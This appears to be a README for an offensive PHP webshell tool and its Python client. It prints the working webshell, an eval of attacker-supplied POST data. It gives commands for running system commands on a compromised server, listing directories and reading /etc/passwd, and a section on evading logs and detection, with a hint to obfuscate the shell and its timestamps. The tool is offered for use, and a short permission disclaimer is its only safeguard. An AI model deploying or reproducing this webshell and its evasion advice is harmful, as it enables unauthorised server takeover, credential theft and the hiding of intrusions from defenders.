# PHP Webshell
#### Disclaimers (before we begin)
1. I am not responsible for anything you do with this. Please only use this if you were granted permission by your targets owner!
2. The webshell.php might not work great on windows machines, simply because I haven't tested it. Once I do I will update the code :)

## Let's Begin!
So as you see there are 2 parts to this webshell:
1. webshell.php - The webshell that you upload
2. client.py - The python3 utility you use to interact with webshell.php after it's been uploaded

If you look at `webshell.php` you'll notice it's very simple:
```php
<?php
	if(isset($_POST['payload']))
	{
		eval($_POST['payload']);
	}
?>
```
All it does is eval the php code given to it via a POST request.  
Using this kind of shell is a bit annoying, which is why the `client.py` was created.  
The client side takes care of converting your commands to php code and passing them to the webshell.  
It also has other functions that allow you to interact with the target via the webshell that don't require executing commands on the system  
(opening new processes and executing commands via a webshell isn't very stealthy).  
## Usage
```
python3 client.py --help
```
##### Let's go through some examples  
Executing commands on the remote os:
```sh
# execute an os command via the "system()" php function
python3 client.py -u http://example.com/webshell.php -t exec -p "ls"

# specify php function to use when executing a command
# supported php functions are: system (default), passthru, shell_exec, exec, backticks
python3 client.py -u http://example.com/webshell.php -t exec -p "ls" -e passthru
```
Passing your own php code to be executed:
```sh
# adding the -v (--verify) flag, will show you details of the request that you are about to send to the webshell.
# if you are passing a complex php code, it might be worth validating it before sending
# (-v is available with all types, not only 'eval')
python3 client.py -u http://example.com/webshell.php -t eval -p 'echo("test")' -v
```
Get current working directory:
```sh
python3 client.py -u http://example.com/webshell.php -t pwd
```
List files in a given path (like ls):
```sh
# if the given path is not a directory on the target machine, the webshell will tell you.
# this function also lists hidden files and directories
python3 client.py -u http://example.com/webshell.php -t dir -p "/home/user/"
```
Read file contents:
```sh
# you can change the name of the parameter that the webshell uses ("payload") before uploading it,
# to whatever you want ("cmd" for example), and then use --post-param to specify the parameter.
# you can also change the `DEFAULT_POST_PARAM` parameter in `client.py` if you don't want to pass it as an argument everytime
python3 client.py -u http://example.com/webshell.php -t cat -p "/etc/passwd" --post-param "cmd"
```
## Stealth
- The webshell only uses POST requests, as GET requests are often better logged.  
- When executing commands we do it like this `bash -c 'exec 2>&1 COMMAND'`, to make sure errors get piped back to us. This is meant to allow us to see errors that might occur, and also makes sure that errors that occur are not shown in log files.
- The entire webshell (aside from the 'exec' type) uses eval(). This means we are not opening new processes on the target, therefore arrousing less suspicion.
- Stuff relating to obfuscation, size and last edited time of the uploaded webshell, I leave for you to do alone and research online :) 
## Future Plans
I want to add an upload/download file feature, might get to that later  
Enjoy!
